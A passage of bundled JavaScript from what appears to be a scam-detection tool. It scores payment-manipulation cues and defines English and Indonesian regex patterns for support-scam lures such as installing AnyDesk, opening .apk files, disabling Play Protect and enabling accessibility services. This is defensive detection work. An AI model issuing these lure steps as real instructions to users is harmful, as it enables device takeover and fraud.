    for (let entry5 of PAY_LEXICON)
      for (let m of src.norm.text.matchAll(entry5.pattern))
        m[0].length > 0 && raw.push({ id: entry5.id, signal: entry5.signal, strong: entry5.strength === "strong", s: m.index, e: m.index + m[0].length });
    raw.sort((a, b) => Number(b.strong) - Number(a.strong) || a.s - b.s || b.e - a.e || a.id.localeCompare(b.id));
    let kept = /* @__PURE__ */ new Map(), out = [];
    for (let r of raw) {
      let spans = kept.get(r.signal) ?? [];
      if (spans.some(([s, e]) => r.s < e && s < r.e)) continue;
      spans.push([r.s, r.e]), kept.set(r.signal, spans);
      let range = toOriginalRange(src.norm, r.s, r.e);
      out.push({
        src,
        nStart: r.s,
        nEnd: r.e,
        o: {
          id: "",
          signal: r.signal,
          kind: kindOfSignal2(r.signal),
          entryId: r.id,
          blockId: src.block.id,
          start: range.start,
          end: range.end,
          text: reportedText(r.signal, src.text.slice(range.start, range.end)),
          regionId: src.region.region.id,
          negated: !1,
          reported: !1
        }
      });
    }
    return out;
  }
  function bindContext2(anchors, cues) {
    for (let d of anchors) {
      let sameSrc = cues.filter((c) => c.src === d.src), neg = sameSrc.filter((c) => c.o.signal === "C.NEGATION" && c.nEnd <= d.nStart && d.nStart - c.nEnd <= 40 && !CLAUSE_BREAK3.test(d.src.norm.text.slice(c.nEnd, d.nStart)));
      if (neg.length > 0) {
        d.o.negated = !0, d.boundBy = neg[neg.length - 1];
        continue;
      }
      let rep = sameSrc.find((c) => c.o.signal === "C.REPORTED" && c.nEnd <= d.nStart && !SENTENCE_BREAK3.test(d.src.norm.text.slice(c.nEnd, d.nStart)));
      if (!rep) {
        let region = d.src.region;
        for (let p = d.src.pos - 1; p >= 0 && d.src.pos - p < 8; p--) {
          let block = region.blocks[p];
          if (!(!block || !/:\s*$/u.test(block.text))) {
            rep = cues.find((c) => c.src.block === block && c.o.signal === "C.REPORTED");
            break;
          }
        }
      }
      rep && (d.o.reported = !0, d.boundBy = rep);
    }
  }
  function requestUnits(sources, signals) {
    let units = [];
    for (let src of sources) {
      let here = signals.filter((s) => s.src === src), prev = signals.filter((s) => s.src.region === src.region && s.src.pos === src.pos - 1), pays = here.filter((s) => s.o.signal === "PY.PAY" && !s.o.negated), releaseFees = here.filter((s) => s.o.signal === "PF.RELEASE_FEE" && !s.o.negated), isObj = (s) => s.o.kind === "object" || s.o.kind === "destination", objects = here.filter(isObj);
      pays.length > 0 && objects.length === 0 && (objects = prev.filter(isObj));
      let amountHere = here.some((s) => s.o.signal === "PA.AMOUNT"), anchors = pays.length > 0 && objects.length > 0 ? pays : releaseFees.length > 0 && amountHere ? releaseFees : [];
      anchors.length !== 0 && units.push({
        src,
        anchors,
        objects: objects.filter((s) => s.o.kind === "object"),
        destinations: [...objects, ...here].filter((s, i, a) => s.o.kind === "destination" && a.indexOf(s) === i),
        conditions: here.filter((s) => s.o.signal === "PC.CONDITION")
      });
    }
    return units;
  }
  function containerKind2(src) {
    let id = src.block.containerId;
    return id.slice(0, id.indexOf(":") + 1);
  }
  function trustOf2(src) {
    let ctx = src.block.ctx ?? {}, kind = containerKind2(src), out = [];
    return (kind === "ugc:" || ctx.ugc) && out.push("user-content"), kind === "widget:" && out.push("third-party-widget"), kind === "frame:" && out.push("embedded-frame"), (kind === "dialog:" || ctx.dialog) && out.push("dialog"), (kind === "overlay:" || ctx.overlay) && out.push("overlay"), ctx.form && out.push("form"), out;
  }
  var UNTRUSTED2 = ["user-content", "third-party-widget", "embedded-frame"], near2 = (src, u) => src.region === u.src.region && Math.abs(src.pos - u.src.pos) < 8, inQuoteOrCode2 = (src) => !!(src.block.ctx?.quote || src.block.ctx?.code || src.block.ctx?.pre);
  function headingEducational2(heading) {
    if (!heading) return !1;
    let text = normalize(heading).text;
    return EDUCATIONAL3.some((e) => [...text.matchAll(e.pattern)].length > 0);
  }
  var RULE_RANK3 = { PR1: 0, PR2: 1, PR3: 2, PR4: 3 };
  function scoreOne2(u, region, signals, cues) {
    let nearby = signals.filter((p) => (p.o.kind === "pressure" || p.o.kind === "receive") && p.o.signal !== "PC.CONDITION" && near2(p.src, u) && (!inQuoteOrCode2(p.src) || p.src === u.src)), has = (sig) => nearby.some((p) => p.o.signal === sig), threat = has("PP.THREAT"), urgency = has("PP.URGENCY"), authority = has("PP.AUTHORITY") || has("PP.FAMILY"), authorityHere = nearby.some((p) => p.o.signal === "PP.AUTHORITY" && p.src === u.src), untrusted = trustOf2(u.src).some((t2) => UNTRUSTED2.includes(t2)), releaseFees = u.objects.filter((o) => o.o.signal === "PF.RELEASE_FEE"), receive = nearby.filter((p) => p.o.kind === "receive"), destinations = ordered(u.destinations.map((d) => DESTINATION_OF[d.o.signal])), recruit = receive.filter((p) => p.o.signal === "PR.RECRUIT"), invest = receive.filter((p) => p.o.signal === "PR.INVEST"), advanceFee = releaseFees.length > 0 || recruit.length > 0 || invest.length > 0 || receive.length > 0 && u.conditions.length > 0, extras = [authority, threat, urgency, destinations.length > 0, untrusted].filter(Boolean).length, ruleId, cls, base, used = [];
    advanceFee ? (ruleId = "PR1", [cls, base] = extras > 0 ? ["manipulative_instruction", "high"] : ["suspicious_correlation", "medium"], used.push(...receive, ...u.conditions, ...nearby.filter((p) => p.o.kind === "pressure"))) : destinations.length > 0 && (authority || threat) ? ([ruleId, cls, base] = ["PR2", "manipulative_instruction", "high"], used.push(...nearby.filter((p) => p.o.kind === "pressure"))) : destinations.length > 0 && (urgency || untrusted || destinations.includes("off-platform")) ? ([ruleId, cls, base] = ["PR2", "suspicious_correlation", "medium"], used.push(...nearby.filter((p) => p.o.kind === "pressure"))) : threat && (authority || urgency) ? (ruleId = "PR3", [cls, base] = authority && urgency ? ["manipulative_instruction", "high"] : ["suspicious_correlation", "medium"], used.push(...nearby.filter((p) => p.o.kind === "pressure"))) : threat && untrusted ? ([ruleId, cls, base] = ["PR3", "suspicious_correlation", "medium"], used.push(...nearby.filter((p) => p.o.kind === "pressure"))) : authorityHere && urgency ? ([ruleId, cls, base] = ["PR3", "suspicious_correlation", "medium"], used.push(...nearby.filter((p) => p.o.kind === "pressure"))) : [ruleId, cls, base] = ["PR4", "observed_instruction", "high"];
    let anchor = u.anchors[0], mods = [];
    u.src.block.ctx?.quote && mods.push({ id: "C.QUOTED", demoteBy: 2, reason: "The request is inside a quotation.", evidence: [anchor] });
    let reported = u.anchors.find((a) => a.o.reported);
    reported && mods.push({
      id: "C.REPORTED",
      demoteBy: 2,
      reason: "The text reports what someone else was asked to do rather than asking the reader.",
      evidence: reported.boundBy ? [reported.boundBy] : []
    }), (u.src.block.ctx?.code || u.src.block.ctx?.pre) && mods.push({ id: "C.CODE_EXAMPLE", demoteBy: 2, reason: "The request text is inside a code sample.", evidence: [`block:${u.src.block.id}`] });
    let eduCues = cues.filter((c) => c.o.signal === "C.EDUCATIONAL" && near2(c.src, u)), eduHeading = headingEducational2(u.src.block.headingContext) ? [`heading:${u.src.block.id}`] : [];
    (eduCues.length > 0 || eduHeading.length > 0) && mods.push({ id: "C.EDUCATIONAL", demoteBy: 1, reason: "The surrounding text is educational or awareness material.", evidence: [...eduCues, ...eduHeading] });
    let demotion = Math.min(2, mods.reduce((n, m) => n + m.demoteBy, 0)), context = [...new Set(used)];
    return {
      units: [u],
      region,
      ruleId,
      ruleClassification: cls,
      modifiers: mods,
      context,
      classification: TIERS3[Math.max(0, TIERS3.indexOf(cls) - demotion)],
      confidence: LEVELS3[Math.max(0, LEVELS3.indexOf(base) - mods.length)],
      promises: ruleId === "PR1" ? ordered([...releaseFees, ...receive].map((o) => PROMISE_OF[o.o.signal])) : [],
      destinations,
      pressures: ordered(context.flatMap((o) => PRESSURE_OF[o.o.signal] ? [PRESSURE_OF[o.o.signal]] : []))
    };
  }
  function score2(units, region, signals, cues) {
    return { ...[...units.map((u) => scoreOne2(u, region, signals, cues))].sort((a, b) => TIERS3.indexOf(b.classification) - TIERS3.indexOf(a.classification) || RULE_RANK3[a.ruleId] - RULE_RANK3[b.ruleId])[0], units };
  }
  function cluster2(units) {
    let sorted = [...units].sort((a, b) => a.src.region.index - b.src.region.index || a.src.pos - b.src.pos), out = [];
    for (let u of sorted) {
      let last = out[out.length - 1];
      last && last.region === u.src.region && u.src.pos - last.units[0].src.pos < 8 ? last.units.push(u) : out.push({ region: u.src.region, units: [u] });
    }
    return out;
  }
  function analyzePayments(snapshot) {
    let sources = buildRegions(snapshot.blocks.slice(0, 5e3)).flatMap((r) => r.blocks.map((b, i) => {
      let text = b.text.slice(0, 2e3);
      return { block: b, text, norm: normalize(text), region: r, pos: i };
    })), signals = [], cues = [];
    for (let src of sources) for (let ob of match2(src)) (ob.o.kind === "context" ? cues : signals).push(ob);
    bindContext2(signals.filter((s) => s.o.signal === "PY.PAY" || s.o.signal === "PF.RELEASE_FEE"), cues);
    let scored = cluster2(requestUnits(sources, signals)).map((c) => score2(c.units, c.region, signals, cues)), used = /* @__PURE__ */ new Set();
    for (let s of scored) {
      for (let u of s.units) for (let o of [...u.anchors, ...u.objects, ...u.destinations, ...u.conditions]) used.add(o);
      for (let o of s.context) used.add(o);
      for (let m of s.modifiers) for (let e of m.evidence) typeof e != "string" && used.add(e);
    }
    let sortedObs = [...used].sort((a, b) => a.src.region.index - b.src.region.index || a.src.pos - b.src.pos || a.nStart - b.nStart || a.o.signal.localeCompare(b.o.signal)), idOf = /* @__PURE__ */ new Map();
    sortedObs.forEach((o, i) => idOf.set(o, `po${i}`));
    let ids = (list) => [...new Set([...list].map((o) => idOf.get(o)))].sort((a, b) => Number(a.slice(2)) - Number(b.slice(2))), findings = scored.map((s, i) => {
      let trust = [...new Set(s.units.flatMap((u) => trustOf2(u.src)))], evidence = [...s.units.flatMap((u) => [...u.anchors, ...u.objects, ...u.destinations, ...u.conditions]), ...s.context], limitations = [];
      s.pressures.includes("claimed-authority") && limitations.push("claimed-identity-unverifiable"), trust.some((t2) => UNTRUSTED2.includes(t2)) && limitations.push("trust-boundary-heuristic"), evidence.some((o) => o.o.signal === "PA.AMOUNT") && limitations.push("amount-not-reported");
      let summary = SUMMARY3[s.ruleId];
      s.modifiers.length > 0 && (summary += ` Context: ${s.modifiers.map((m) => m.reason).join(" ")}`);
      let irreversible = s.destinations.length > 0 || s.ruleId === "PR1";
      return {
        id: `p${i}`,
        category: "payment_manipulation",
        ruleId: s.ruleId,
        ruleName: PAY_RULES[s.ruleId].name,
        classification: s.classification,
        ruleClassification: s.ruleClassification,
        confidence: s.confidence,
        actionRisk: irreversible ? "high" : "medium",
        promises: s.promises,
        destinations: s.destinations,
        pressures: s.pressures,
        trustContext: trust,
        regionId: s.region.region.id,
        observationIds: ids(evidence),
        modifiers: s.modifiers.map((m) => ({ ...m, evidence: m.evidence.map((e) => typeof e == "string" ? e : idOf.get(e)) })),
        limitations,
        summary
      };
    }), verdict = "none";
    for (let f of findings) (verdict === "none" || TIERS3.indexOf(f.classification) > TIERS3.indexOf(verdict)) && (verdict = f.classification);
    return {
      detector: "payment",
      detectorVersion: PAY_DETECTOR_VERSION,
      experimental: !0,
      schemaVersion: 1,
      verdict,
      findings,
      observations: sortedObs.map((o) => ({ ...o.o, id: idOf.get(o) }))
    };
  }

  // src/core/support/lexicon.ts
  function entry4(id, signal, lang, strength, source, examples) {
    return { id, signal, lang, strength, pattern: new RegExp(source, "gu"), examples };
  }
  var REMOTE_TOOL = "(?:anydesk|teamviewer(?:\\s+quick\\s*support)?|quick\\s*support|rustdesk|ultraviewer|supremo|airdroid|remote\\s+desktop|remote\\s+access\\s+(?:app|tool|software))", APK_FILE = "[\\p{L}\\p{N}_()-]+\\.apk", APP = "(?:apps?|application|software|program|tool|apk|\\.apk|aplikasi|apl|file\\s+apk)", BRAND_ID = "(?:bri|bni|bca|mandiri|bsi|btn|cimb(?:\\s+niaga)?|danamon|permata|dana|ovo|gopay|shopee(?:pay)?|tokopedia|lazada|bukalapak|blibli|akulaku|kredivo|jne|j&t|sicepat|pln|pertamina|telkomsel|indosat|bpjs(?:\\s+kesehatan)?|pos\\s+indonesia|indomaret|alfamart)", WIN_VERB = "(?:t(?:er)?pil(?:i)?h|terpilh|mendapat(?:kan)?|m['\u2019-]?\\s?dpt(?:kan|kn)?|mndpt(?:kan|kn)?|mendpt(?:kan|kn)?|men-?dpt(?:kan|kn)?|meraih|memenangkan|menang)", ACTIONS = [
    entry4(
      "sup.en.contact",
      "SC.CONTACT",
      "en",
      "strong",
      `${B}(?:call|phone|ring|dial|contact|reach|text|message|chat\\s+with|speak\\s+(?:to|with)|talk\\s+to|get\\s+in\\s+touch\\s+with)${E}`,
      ["call", "contact", "chat with", "speak to"]
    ),
    entry4(
      "sup.id.contact",
      "SC.CONTACT",
      "id",
      "strong",
      `${B}(?:hubungi|hubungin|hub|kontak|telepon|telpon|telp|tlp|tlpn|chat|japri|wa(?=\\s+(?:ke|kami|cs|admin|mimin|min|aja|saja))|hubungi\\s+kami)${E}`,
      ["hubungi", "hub", "telp", "japri", "wa ke"]
    ),
    // Remote control of the reader's device: a tool name with a direction, granting access, or sharing the screen.
    entry4(
      "sup.en.remote",
      "SA.REMOTE",
      "en",
      "strong",
      `${B}(?:(?:install|download|open|run|launch|use|start)\\s+(?:the\\s+|our\\s+)?${REMOTE_TOOL}|(?:allow|grant|give)\\s+(?:us\\s+|me\\s+|the\\s+technician\\s+|our\\s+technician\\s+)?remote\\s+(?:access|control)|share\\s+(?:your|the)\\s+screen|(?:read|send|give)\\s+(?:us\\s+|me\\s+)?the\\s+(?:anydesk|teamviewer)\\s+(?:code|id))${E}`,
      ["install AnyDesk", "download TeamViewer QuickSupport", "allow remote access", "share your screen"]
    ),
    entry4(
      "sup.id.remote",
      "SA.REMOTE",
      "id",
      "strong",
      `${B}(?:(?:instal|install|pasang|unduh|download|dl|donlot|buka|jalankan)\\s+${REMOTE_TOOL}|(?:izinkan|berikan|kasih)\\s+akses\\s+(?:kendali\\s+)?(?:jarak\\s+jauh|remote)|(?:bagikan|share|bagi)\\s+layar|(?:kirim|kasih|sebutkan|berikan)\\s+(?:kode|id)\\s+(?:anydesk|teamviewer))${E}`,
      ["instal AnyDesk", "izinkan akses jarak jauh", "berikan akses kendali jarak jauh", "share layar", "kirim kode anydesk"]
    ),
    // A reply, choice, link or form that moves the reader into the sender's flow (sup-0.4.0, D-091). "Reply STOP" opt-outs are not.
    entry4(
      "sup.id.respond",
      "SC.RESPOND",
      "id",
      "strong",
      `${B}(?:balas(?:lah)?\\s+(?:dengan\\s+)?(?:angka\\s+)?(?:\\d|ya|setuju|pesan\\s+ini)|ketik\\s*[,(]*\\s*\\(?\\s*(?:ya|y|setuju|\\d)\\b|kirim(?:kan)?\\s+(?:jawaban|balasan)|(?:klik|buka|kunjungi|akses)\\s+(?:link|tautan|situs|website)|(?:isi|lengkapi)\\s+(?:formulir|form|data\\s+(?:diri|anda))|(?:melalui|lewat|via)\\s+(?:tautan|link)|konfirmasi\\s*/\\s*persetujuan|(?:di\\s?)?wajib(?:kan)?\\s+(?:melakukan\\s+)?(?:verifikasi|pengosongan|pemulihan|menghubungkan|hubungkan)|wajib\\s+hubungkan)${E}`,
      ["balas 1 atau 2", "ketik,(YA)", "kirim jawaban", "klik link", "isi formulir", "melalui tautan", "KONFIRMASI/PERSETUJUAN", "di wajibkan melakukan verifikasi"]
    ),
    entry4(
      "sup.en.respond",
      "SC.RESPOND",
      "en",
      "strong",
      `${B}(?:reply\\s+(?:with\\s+)?(?:yes|y|\\d)|(?:click|tap|open|visit)\\s+(?:on\\s+)?(?:the\\s+|this\\s+)?(?:link|here)|fill\\s+(?:in|out)\\s+(?:the\\s+|this\\s+)?form|(?:via|through|using)\\s+the\\s+link)${E}`,
      ["reply YES", "click the link", "fill out the form", "via the link"]
    ),
    // A quiz or questionnaire the reader is asked to answer (sup-0.5.0, prize-survey lures).
    entry4(
      "sup.id.survey",
      "SC.SURVEY",
      "id",
      "strong",
      `${B}(?:kuesioner|kuisioner|survei|pertanyaan\\s+\\d+\\s+dari\\s+\\d+|jawab(?:lah)?\\s+(?:\\d+\\s+)?pertanyaan)${E}`,
      ["kuesioner", "Pertanyaan 1 dari 4", "jawab 4 pertanyaan"]
    ),
    entry4(
      "sup.en.survey",
      "SC.SURVEY",
      "en",
      "strong",
      `${B}(?:questionnaire|survey|question\\s+\\d+\\s+of\\s+\\d+|answer\\s+(?:\\d+\\s+)?(?:simple\\s+)?questions)${E}`,
      ["questionnaire", "Question 1 of 4"]
    ),
    // Installing an app or file the page or message points to.
    entry4(
      "sup.en.install",
      "SA.INSTALL",
      "en",
      "strong",
      `${B}(?:install|download)\\s+(?:the\\s+|this\\s+|our\\s+|a\\s+)?(?:[\\p{L}-]+\\s+){0,2}?${APP}${E}`,
      ["install our security app", "download this application", "download the apk"]
    ),
    entry4(
      "sup.id.install",
      "SA.INSTALL",
      "id",
      "strong",
      `${B}(?:instal|install|pasang|unduh|download|dl|donlot)\\s+(?:[\\p{L}-]+\\s+){0,2}?${APP}${E}`,
      ["instal aplikasi", "unduh aplikasi berikut", "dl apk", "download aplikasi cek resi"]
    ),
    // Opening or installing an Android app file (.apk) named in the text (sup-0.8.0, D-102).
    entry4(
      "sup.apk_open",
      "SA.INSTALL",
      "id",
      "strong",
      `${B}(?:buka|bukak|klik|lihat|liat|cek|unduh|download|instal|install|pasang|jalankan|open|tap|click|view)\\s+(?:\\p{L}+\\s+){0,4}?(?:${APK_FILE}|(?:file|berkas)\\s+apk|apk)${E}`,
      ["buka file undangan.apk", "klik lihat foto paket.apk", "download file apk", "open the invitation.apk"]
    ),
    // Turning off the device's protection, or granting what banking trojans need: unknown sources, accessibility (sup-0.8.0, D-102).
    entry4(
      "sup.id.disable",
      "SA.DISABLE",
      "id",
      "strong",
      `${B}(?:(?:matikan|mematikan|nonaktifkan|menonaktifkan|non-?aktifkan|disable)\\s+(?:dulu\\s+|sementara\\s+)?(?:fitur\\s+|layanan\\s+)?(?:google\\s+)?(?:play\\s+protect|anti-?virus|perlindungan\\s+(?:browser|perangkat|keamanan|hp|ponsel)|proteksi(?:\\s+(?:browser|perangkat|hp|ponsel))?|windows\\s+defender|firewall|pemindaian\\s+(?:keamanan|aplikasi))|(?:izinkan|aktifkan|centang|berikan\\s+izin)\\s+(?:instal(?:asi)?\\s+(?:aplikasi\\s+)?(?:dari\\s+)?)?(?:sumber\\s+(?:yang\\s+)?(?:tidak|tak)\\s+(?:dikenal|diketahui)|aplikasi\\s+(?:dari\\s+)?(?:sumber\\s+)?(?:tidak|tak)\\s+dikenal)|(?:aktifkan|izinkan|nyalakan|berikan)\\s+(?:izin\\s+|akses\\s+)?(?:layanan\\s+)?aksesibilitas)${E}`,
      ["matikan Play Protect", "menonaktifkan perlindungan browser", "izinkan sumber tidak dikenal", "aktifkan aksesibilitas"]
    ),
    entry4(
      "sup.en.disable",
      "SA.DISABLE",
      "en",
      "strong",
      `${B}(?:(?:disable|turn\\s+off|deactivate|switch\\s+off|pause)\\s+(?:your\\s+|the\\s+)?(?:google\\s+)?(?:play\\s+protect|anti-?virus|windows\\s+defender|real[\\s-]time\\s+protection|firewall|browser\\s+protection|security\\s+(?:software|protection))|allow\\s+(?:installs?|installation|apps?)\\s+from\\s+unknown\\s+sources|(?:enable|turn\\s+on|allow|grant)\\s+(?:the\\s+)?accessibility\\s+(?:service|permission|access))${E}`,
      ["disable Play Protect", "turn off your antivirus", "allow installs from unknown sources", "enable accessibility service"]
    )
  ], CHANNELS = [
    // An Android app file named in the text ("Undangan Pernikahan Digital.apk", "file APK"). Only its presence counts (D-102).
    entry4("sup.apk_file", "SX.APK", "en", "strong", `${B}(?:${APK_FILE}|(?:file|berkas|aplikasi)\\s+apk|apk\\s+file)${E}`, ["undangan.apk", "Foto_Paket.apk", "file APK", "apk file"]),
    // A link in the text. Only its presence counts; the address is never reported or judged (no domain lists, D1).
    entry4(
      "sup.link",
      "SX.LINK",
      "en",
      "strong",
      `${B}(?:https?://[^\\s<>"']+|www\\.[^\\s<>"']+|[a-z0-9-]+(?:\\.[a-z0-9-]+)*\\.(?:com|id|net|org|xyz|top|site|online|info|link|me|io|app|ly|cc|biz|click|icu|vip|shop)/[^\\s<>"']*)`,
      ["https://example.invalid/x", "www.example.invalid", "bio.site/konfirmasi"]
    ),
    // Phone numbers (9–15 digits, checked in analyze.ts). The number itself is never reported.
    entry4(
      "sup.phone",
      "SX.PHONE",
      "en",
      "strong",
      `${B}(?:\\+\\s?\\d{1,3}[\\s.-]?)?(?:\\(\\d{1,4}\\)\\s?)?\\d{2,5}(?:[\\s.-]\\d{2,5}){1,4}${E}|${B}\\+?\\d{9,15}${E}`,
      ["+1 (888) 555-0199", "0812-3456-7890", "+62 812 3456 7890", "081234567890"]
    ),
    entry4(
      "sup.en.messenger",
      "SX.MESSENGER",
      "en",
      "strong",
      `${B}(?:whats\\s?app|wa\\.me|telegram|t\\.me|messenger|wechat|viber|line\\s+id|direct\\s+message|dm)${E}`,
      ["WhatsApp", "Telegram", "DM"]
    ),
    entry4(
      "sup.id.messenger",
      "SX.MESSENGER",
      "id",
      "strong",
      `${B}(?:wa|whatsapp|japri|tele|telegram|inbox|dm)${E}`,
      ["WA", "japri", "tele"]
    )
  ], CLAIMS = [
    entry4(
      "sup.en.claim_support",
      "SI.SUPPORT",
      "en",
      "weak",
      `${B}(?:(?:customer|technical|tech)\\s+support|support\\s+(?:team|agent|center|centre|line|desk)|help\\s*desk|customer\\s+(?:service|care)|courier|delivery\\s+(?:agent|team)|official\\s+(?:support|account|team)|(?:certified|authori[sz]ed)\\s+technicians?|(?:microsoft|windows|apple|google)\\s+(?:support|technicians?|helpline))${E}`,
      ["technical support", "support team", "help desk", "Windows support", "certified technician"]
    ),
    entry4(
      "sup.id.claim_support",
      "SI.SUPPORT",
      "id",
      "weak",
      `${B}(?:customer\\s+service|cs(?:\\s+(?:resmi|official|kami))?|layanan\\s+pelanggan|call\\s+center|teknisi\\s+resmi|tim\\s+(?:support|dukungan|bantuan)|pusat\\s+bantuan\\s+resmi|kurir(?:\\s+resmi)?|petugas(?:\\s+(?:ekspedisi|pengiriman|resmi))?|dukungan\\s+teknis)${E}`,
      ["customer service", "CS resmi", "call center", "teknisi resmi", "kurir"]
    ),
    entry4(
      "sup.en.claim_bank",
      "SI.BANK",
      "en",
      "weak",
      `${B}(?:bank\\s+(?:officer|representative|staff|security|fraud\\s+team)|fraud\\s+(?:department|team|prevention\\s+team)|(?:your|the)\\s+bank['\u2019]s\\s+(?:security|fraud)\\s+team)${E}`,
      ["bank officer", "fraud department"]
    ),
    entry4("sup.id.claim_bank", "SI.BANK", "id", "weak", `${B}(?:petugas\\s+bank|pihak\\s+bank|staf\\s+bank|tim\\s+fraud|cs\\s+bank)${E}`, ["petugas bank", "pihak bank"]),
    // A notice addressed to a bank's customers or signed as a bank (sup-0.4.0): still a claim, never verified.
    entry4(
      "sup.id.claim_bank_notice",
      "SI.BANK",
      "id",
      "weak",
      `${B}(?:(?:kepada|yth\\.?)\\s+(?:bpk\\s*/\\s*ibu\\s+|bapak\\s*/\\s*ibu\\s+)?nasabah|nasabah\\s+(?:yang\\s+terhormat|yth|bank)|pt\\.?\\s+bank\\s+\\p{L}+|bank\\s+${BRAND_ID}|${BRAND_ID}\\s+info|kartu\\s+kredit\\s+${BRAND_ID}|kartu\\s+(?:kredit|debit)\\s+(?:bank\\s+)?\\p{L}+(?:\\s+\\p{L}+)?\\s+anda)${E}`,
      ["Kepada Nasabah", "Nasabah Yang Terhormat", "PT. Bank Negara", "Bank BRI", "BRI Info", "Kartu Kredit BNI"]
    ),
    entry4(
      "sup.id.claim_brand_support",
      "SI.SUPPORT",
      "id",
      "weak",
      `${B}(?:${BRAND_ID}\\s+(?:care|cs|official|support|affiliate|indonesia)|(?:cs|customer(?:\\s+service)?|layanan(?:\\s+pelanggan)?|pelayanan|admin|tim|pihak)\\s+(?:resmi\\s+)?${BRAND_ID}|pt\\.?\\s+${BRAND_ID})${E}`,
      ["DANA Care", "CUSTOMER DANA", "Layanan Pelanggan Shopee", "Admin Shopee", "PT SHOPEE"]
    ),
    // A company or institution named with an anniversary, prize or promotion (sup-0.5.0): a claim only, never verified.
    entry4(
      "sup.id.claim_org",
      "SI.ORG",
      "id",
      "weak",
      `${B}(?:${BRAND_ID}\\s*[-\u2013\xB7:]?\\s*(?:\\d+\\s*(?:th\\s+)?)?(?:anniversary|hut|ulang\\s+tahun|hadiah|promo)|(?:hut|ulang\\s+tahun|anniversary)\\s+(?:ke-?\\s*\\d+\\s+)?${BRAND_ID})${E}`,
      ["PLN - 81 anniversary", "HUT ke-81 PLN", "Pertamina hadiah"]
    ),
    entry4(
      "sup.en.claim_admin",
      "SI.ADMIN",
      "en",
      "weak",
      `${B}(?:(?:system|site|network|it)\\s+administrator|administrator|admin\\s+team|it\\s+department|moderator\\s+team)${E}`,
      ["system administrator", "IT department"]
    ),
    entry4("sup.id.claim_admin", "SI.ADMIN", "id", "weak", `${B}(?:admin(?:istrator)?(?:\\s+(?:resmi|grup|sistem))?|mimin|tim\\s+it|bagian\\s+it)${E}`, ["admin", "mimin", "tim IT"]),
    entry4(
      "sup.en.claim_security",
      "SI.SECURITY",
      "en",
      "weak",
      `${B}(?:security\\s+(?:team|department|center|centre)|(?:microsoft|windows|apple)\\s+(?:security|defender)|cyber\\s+security\\s+unit)${E}`,
      ["security team", "Windows Defender"]
    ),
    entry4("sup.id.claim_security", "SI.SECURITY", "id", "weak", `${B}(?:tim\\s+keamanan|pusat\\s+keamanan|divisi\\s+keamanan)${E}`, ["tim keamanan"]),
    // Ranks, positions and investigators used to impersonate officials (P2, D-087): a claim only, never verified.
    entry4("sup.id.claim_official", "SI.OFFICIAL", "id", "weak", `${B}(?:dandim|danrem|pangdam|danyon|danramil|kapolres|kapolda|kapolsek|kasdam|ajudan|babinsa|perwira|komandan|kolonel|letkol|mayor|kapten|lettu|letda|jenderal|brigjen|sertu|serka|pejabat|staf\\s+ahli|penyidik|bagian\\s+penyidikan|petugas\\s+kepolisian|pihak\\s+kepolisian)${E}`, ["Kapten", "penyidik", "Dandim", "pihak kepolisian"]),
    entry4("sup.en.claim_official", "SI.OFFICIAL", "en", "weak", `${B}(?:colonel|captain|lieutenant|commanding\\s+officer|investigator|detective|police\\s+officer|federal\\s+agent)${E}`, ["investigator", "police officer"])
  ], PRESSURE2 = [
    // What an app file is presented as: an invitation, a parcel photo or receipt, a traffic ticket, a bill (D-102). Ordinary words;
    // they only count together with an app file.
    entry4(
      "sup.id.document",
      "SD.DOCUMENT",
      "id",
      "weak",
      `${B}(?:(?:surat[\\s_-]+)?undangan(?:nya|[\\s_-]+(?:pernikahan|nikah|digital|resmi))?|(?:foto|bukti|cek|lihat|detail|rincian)[\\s_-]+(?:paket|resi|pengiriman|kiriman|barang)|resi(?:nya|[\\s_-]+(?:pengiriman|paket))?|surat[\\s_-]+(?:tilang|panggilan|tagihan|pemberitahuan)|e-?tilang|tilang[\\s_-]+elektronik|tagihan\\s+(?:bpjs|pln|pajak|listrik|kartu\\s+kredit|pinjaman)|(?:struk|nota|faktur)\\s+(?:pembayaran|transaksi))${E}`,
      ["Surat Undangan Pernikahan Digital", "undangannya", "Undangan_Pernikahan", "foto paket", "resi pengiriman", "surat tilang", "tagihan BPJS"]
    ),
    entry4(
      "sup.en.document",
      "SD.DOCUMENT",
      "en",
      "weak",
      `${B}(?:(?:wedding\\s+)?invitation|(?:parcel|package|delivery)\\s+(?:photo|picture|receipt|details)|tracking\\s+(?:receipt|slip|details)|traffic\\s+(?:ticket|fine)|(?:unpaid\\s+)?invoice)${E}`,
      ["wedding invitation", "parcel photo", "traffic ticket", "invoice"]
    ),
    // A virus, hack or lock asserted about the reader's device or browser; conditionals ("if your PC is infected") are hypothetical.
    entry4(
      "sup.en.alert",
      "SW.ALERT",
      "en",
      "strong",
      `${B}(?:(?:your|this)\\s+(?:computer|pc|device|system|browser|phone|mac|windows)\\s+(?:is|has\\s+been|was|may\\s+be)\\s+(?:infected|compromised|hacked|locked|blocked|disabled)|(?:virus(?:es)?|trojans?|malware|spyware|adware)\\s+(?:has\\s+been\\s+|have\\s+been\\s+|were\\s+)?(?:detected|found)\\s+on\\s+(?:your|this)|(?:access\\s+to\\s+)?this\\s+(?:pc|computer)\\s+has\\s+been\\s+blocked|security\\s+breach\\s+detected|do\\s+not\\s+(?:shut\\s+down|restart|turn\\s+off|close)\\s+(?:your\\s+)?(?:computer|pc|this\\s+(?:window|page)))${E}`,
      ["Your computer is infected", "virus detected on your", "This PC has been blocked", "Do not restart your computer"]
    ),
    // Detection claims by a named or generic "security" component ("Windows has detected a Zeus trojan", "a threat was detected").
    entry4(
      "sup.en.alert_detected",
      "SW.ALERT",
      "en",
      "strong",
      `${B}(?:(?:has|have)\\s+detected\\s+(?:an?\\s+)?(?:[\\p{L}-]+\\s+){0,2}?(?:threat|virus(?:es)?|trojan|malware|spyware|infection|intrusion|hack(?:ing)?\\s+attempt)s?|(?<!(?:no|0|zero)\\s)(?:threats?|virus(?:es)?|trojans?|malware|spyware|infections?)\\s+(?:(?:was|were|has\\s+been|have\\s+been)\\s+)?detected(?:\\s+on\\s+(?:this|your)\\s+(?:device|computer|pc|system))?)${E}`,
      ["Windows has detected a Zeus trojan", "has detected a threat", "virus detected on this device"]
    ),
    entry4(
      "sup.id.alert",
      "SW.ALERT",
      "id",
      "strong",
